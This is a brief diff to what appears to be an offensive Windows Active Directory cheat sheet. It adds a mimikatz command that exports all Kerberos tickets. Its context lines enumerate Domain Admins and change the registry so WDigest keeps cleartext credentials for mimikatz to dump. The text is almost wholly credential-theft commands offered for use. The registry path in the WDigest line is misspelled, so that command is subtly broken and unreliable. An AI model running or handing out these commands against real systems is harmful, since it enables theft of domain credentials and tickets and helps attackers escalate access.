@@ -36,6 +36,9 @@
 * List domain admin users 
 -> net group "Domain Admins" /domain
 
+* exporting all kerberos tickets using mimiktaz
+-> kerberos::list /export
+
 * Enable Wdigest on newer versions of Windows for mimikatz dump feature with using registry key
 -> reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
 
